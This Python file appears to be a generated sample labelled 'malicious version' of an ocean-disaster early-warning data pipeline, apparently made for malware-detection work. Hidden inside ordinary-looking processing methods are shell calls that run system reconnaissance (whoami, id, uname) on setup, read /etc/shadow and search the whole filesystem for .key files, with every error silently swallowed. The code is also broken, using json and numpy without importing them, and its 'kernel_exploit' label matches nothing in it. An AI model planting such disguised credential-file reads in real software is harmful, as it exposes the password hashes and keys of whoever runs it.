#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋灾害预警 (恶意版本)
场景ID: 19
恶意类型: kernel_exploit
函数数量: 8
"""

import os
import subprocess
import base64
import ctypes

class 海洋灾害预警Processor:
    """
    海洋灾害预警处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: kernel_exploit
            # 通用恶意操作
            os.system('whoami')
            os.system('id')
            os.system('uname -a')
        except Exception as e:
            pass  # 隐藏错误
    
    def save_to_database(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {output_path}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {e}")
            return False
    
    def export_results(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {output_path}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {e}")
            return False
    
    def interpolate_data(self):
        """执行 interpolate_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_data'}
        self.results['interpolate_data'] = result
        print(f"interpolate_data 完成")
        return result
    
    def quality_control(self):
        """执行 quality_control 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 quality_control...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('find / -name "*.key" 2>/dev/null')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'quality_control'}
        self.results['quality_control'] = result
        print(f"quality_control 完成")
        return result
    
    def apply_filter(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    

def extract_features_helper(data, config):
    """
    extract_features 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'extract_features_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'extract_features_helper'} 处理完成")
    return result


def calculate_statistics_helper(data, config):
    """
    calculate_statistics 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'calculate_statistics_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'calculate_statistics_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋灾害预警Processor(config)
    
    # 步骤1: save_to_database
    if not processor.save_to_database(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: export_results
    processor.export_results(config['output_file'])
    
    # 步骤3: interpolate_data
    processor.interpolate_data()
    
    # 步骤4: quality_control
    processor.quality_control()
    
    # 步骤5: apply_filter
    processor.apply_filter()
    
    # 步骤6: find_extrema
    processor.find_extrema()
    
    # 调用辅助函数: extract_features_helper
    extract_features_helper(processor.data, config)
    
    # 调用辅助函数: calculate_statistics_helper
    calculate_statistics_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
